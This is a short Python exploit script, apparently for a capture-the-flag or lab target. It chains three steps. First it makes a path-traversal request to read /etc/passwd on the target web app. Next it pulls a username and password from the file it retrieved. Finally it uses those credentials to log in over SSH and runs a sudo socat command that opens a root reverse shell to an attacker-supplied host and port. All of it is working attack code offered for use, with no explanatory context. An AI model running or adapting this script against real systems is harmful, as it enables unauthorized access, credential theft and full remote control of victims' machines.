import requests
import sys, time
from bs4 import BeautifulSoup
import paramiko

host = sys.argv[1]

lhost = input("\nLHOST:\n")
lport = input("\nLPORT:\n")

req = requests.get(f'http://'+host+'/article?name=../../../etc/passwd')
html = req.content

cleantags = BeautifulSoup(html, "lxml").text
creds = cleantags.replace(' ', '').replace('\n\n\n\n', ' ')

with open('usernames.txt', 'w') as file:
    file.write("{}".format(creds))
    file.close()

username = open('usernames.txt', 'r').readlines()[30].replace("#",'').split(":")[0]
password = open('usernames.txt', 'r').readlines()[30].replace('\n', '').split(":")[1]


def is_ssh_open(host, user, passwd, lhost, lport):

    sshclient = paramiko.SSHClient()
    sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try: 
        sshclient.connect(host, port=22, username=user, password=passwd)
    except paramiko.ssh_exception.AuthenticationException:
        print("Invalid Credentials")
    else:
        stdin, stdout, stderr = sshclient.exec_command("sudo socat tcp-connect:"+lhost+":"+lport+" exec:/bin/sh,pty,stderr,setsid,sigint,sane")
        time.sleep(5)
        outline = stdout.readlines()
        outline = "".join(outline)
        print(outline)

    sshclient.close()

if __name__ == '__main__':
    
    is_ssh_open(host, "{}".format(username), "{}".format(password), lhost, lport)